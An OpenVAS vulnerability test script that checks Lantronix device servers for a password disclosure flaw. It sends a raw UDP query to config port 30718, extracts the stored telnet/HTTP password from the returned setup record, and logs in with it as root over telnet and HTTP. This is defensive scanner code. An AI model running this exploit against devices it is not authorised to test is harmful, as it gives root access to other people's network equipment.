###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_lantronix_password_disclosure.nasl 7573 2017-10-26 09:18:50Z cfischer $
#
# Lantronix Device Server Password Disclosure
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Lantronix Device Server is prone to a Password Disclosure.

It was possible to retrieve the setup record from Lantronix devices via the
config port (30718/udp, enabled by default) and to extract the telnet/http
password.";

tag_solution = "Disable access to udp port 30718.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103598";

if (description)
{
 script_oid(SCRIPT_OID);
 script_version ("$Revision: 7573 $");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_name("Lantronix Device Server Password Disclosure");

 script_tag(name:"last_modification", value:"$Date: 2017-10-26 11:18:50 +0200 (Thu, 26 Oct 2017) $");
 script_tag(name:"creation_date", value:"2012-10-29 15:28:00 +0100 (Mon, 29 Oct 2012)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("General");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl");
 script_require_ports("Services/www",9999);
 script_require_udp_ports("30718");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("misc_func.inc");
include("telnet_func.inc");

config_port = 30718;
if(!get_udp_port_state(config_port))exit(0);

function check_telnet(password) {

  telnet_port = 9999;
  if(!get_port_state(telnet_port))return FALSE;

  sock = open_sock_tcp(telnet_port);
  if(!sock)return FALSE;

  recv = telnet_negotiate(socket:sock);

  if("Lantronix" >!< recv && "MAC" >!< recv)return FALSE;

  if("Password" >< recv && !empty_password) {
    req = string(password,"\r\n\r\n");
  } else {
    req = string("\r\n\r\n");
  }  

  send(socket:sock, data:req);
  recv = recv(socket:sock, length:65535);

  close(sock);

  if("Change Setup" >< recv && "Hardware:" >< recv && "Baudrate" >< recv && "Server" >< recv) {
    
    if(empty_password) {
      report = 'It was possible to login using an empty password\n';
    } else {
      report = 'It was possible to login using password "' + password + '"\n';
    }
    security_message(port:telnet_port,data:report);
    exit(0);
  }

  return FALSE;      
    
}

function check_http(password) {

  http_port = get_http_port(default:80);
  if(!get_port_state(http_port))return FALSE;

  url = '/secure/welcome.htm';
  req = http_get(item:url, port:http_port);
  buf = http_send_recv(port:http_port, data:req, bodyonly:FALSE);

  if("401 Unauthorized" >!< buf)return FALSE;

  userpass = 'root:' + password;
  userpass64 = base64(str:userpass);

  req = string("GET ",url," HTTP/1.0\r\n",
               "Authorization: Basic ",userpass64,"\r\n",
               "\r\n");

  buf = http_send_recv(port:http_port, data:req, bodyonly:FALSE);

  if(buf =~ "HTTP/1.. 200") {

    if(empty_password) {
      report = 'It was possible to login as root using an empty password\n';
    } else {
      report = 'It was possible to login as root using password "' + password + '"\n';
    }

    security_message(port:http_port, data:report);
    exit(0);
  }

}

sock = open_sock_udp(config_port);
if(!sock)exit(0);

req = raw_string(0x00,0x00,0x00,0xf8);
send(socket:sock, data:req);

data = recv(socket:sock, length:65535);
close(sock);

if(!data || hexstr(data[3]) != "f9")exit(0);

for(i=12; i<16;i++) {

  pass += data [i];

}  

if(!pass || strlen(pass) != "4")exit(0);

if(hexstr(pass) == "00000000") {
    password = ""; # device has an empty password
    empty_password = TRUE;  
} else {
    password = pass;
}  

check_telnet(password:password);
check_http(password:password);


exit(0); 
